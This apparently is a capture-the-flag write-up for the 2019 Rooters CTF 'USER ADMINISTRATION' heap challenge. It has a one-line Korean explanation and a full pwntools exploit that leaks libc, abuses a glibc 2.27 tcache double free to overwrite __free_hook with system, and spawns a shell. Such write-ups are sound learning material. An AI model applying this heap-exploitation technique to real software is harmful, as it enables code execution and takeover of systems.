---
title: "2019 Rooters CTF USER ADMINISTRATION"
date: 2020-8-19
ctf: Rooters CTF
layout: post
---

* 2.27 tcache

strdup을 이용해서 잘 할당해주고 __free_hook을 system으로 덮고 fd에 /bin/sh 문자열 넣으면 된다.

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./vuln')
p = process('./vuln')
libc = e.libc
root = 0x0000000000004088
message = 0x0000000000004090

def create(age,name):
	p.sendlineafter(':','0')
	p.sendlineafter(':',str(age))
	p.sendafter(':',name)

def edit(age,name):
	p.sendlineafter(':','1')
	p.sendlineafter(':',str(age))
	p.sendlineafter(':',name)

def delete():
	p.sendlineafter(':','2')

def sendMSG(msg):
	p.sendlineafter(':','3')
	p.sendafter(':',msg)

sendMSG('A'*0x68)
l = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.info(hex(l))
libc_base = l - 0x80bd2
log.info(hex(libc_base))

create(0xAAAA,'AAAA')
delete()
delete()
edit(0xAAAA,p64(libc_base + libc.symbols['__free_hook']))
sendMSG('/bin/sh\x00')
sendMSG(p64(libc_base + libc.symbols['system']))
delete()

p.interactive()
```

